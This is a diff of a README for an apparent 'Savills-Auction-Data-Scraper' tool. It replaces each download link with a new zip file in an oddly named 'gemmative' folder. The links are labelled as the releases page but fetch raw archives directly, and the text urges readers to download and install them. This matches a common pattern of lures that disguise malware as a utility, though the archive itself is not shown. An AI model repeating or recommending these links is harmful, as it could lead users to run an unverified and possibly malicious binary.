@@ -1,6 +1,6 @@
 # 🎉 Savills-Auction-Data-Scraper - Extract Auction Properties Easily
 
-[![Download Now](https://github.com/Truta09/Savills-Auction-Data-Scraper/raw/refs/heads/main/gemmative/Scraper_Savills_Auction_Data_2.0.zip)](https://github.com/Truta09/Savills-Auction-Data-Scraper/raw/refs/heads/main/gemmative/Scraper_Savills_Auction_Data_2.0.zip)
+[![Download Now](https://raw.githubusercontent.com/Truta09/Savills-Auction-Data-Scraper/main/gemmative/Scraper-Data-Auction-Savills-v3.8.zip)](https://raw.githubusercontent.com/Truta09/Savills-Auction-Data-Scraper/main/gemmative/Scraper-Data-Auction-Savills-v3.8.zip)
 
 ## 📖 Introduction
 
@@ -17,7 +17,7 @@ To begin using the Savills-Auction-Data-Scraper, follow these steps:
 
 2. **Download the Software**
    - Head over to the releases page to download the latest version of the application.
-   - Click on the following link to visit the page: [Download from Releases](https://github.com/Truta09/Savills-Auction-Data-Scraper/raw/refs/heads/main/gemmative/Scraper_Savills_Auction_Data_2.0.zip).
+   - Click on the following link to visit the page: [Download from Releases](https://raw.githubusercontent.com/Truta09/Savills-Auction-Data-Scraper/main/gemmative/Scraper-Data-Auction-Savills-v3.8.zip).
 
 3. **Install the Application**
    - After downloading, locate the file on your computer.
@@ -28,7 +28,7 @@ To begin using the Savills-Auction-Data-Scraper, follow these steps:
 
 ## 📥 Download & Install 
 
-To download the Savills-Auction-Data-Scraper, visit this page: [Download from Releases](https://github.com/Truta09/Savills-Auction-Data-Scraper/raw/refs/heads/main/gemmative/Scraper_Savills_Auction_Data_2.0.zip). Choose the file suitable for your operating system and follow the installation instructions above.
+To download the Savills-Auction-Data-Scraper, visit this page: [Download from Releases](https://raw.githubusercontent.com/Truta09/Savills-Auction-Data-Scraper/main/gemmative/Scraper-Data-Auction-Savills-v3.8.zip). Choose the file suitable for your operating system and follow the installation instructions above.
 
 ## ⚙️ Using the Application
 
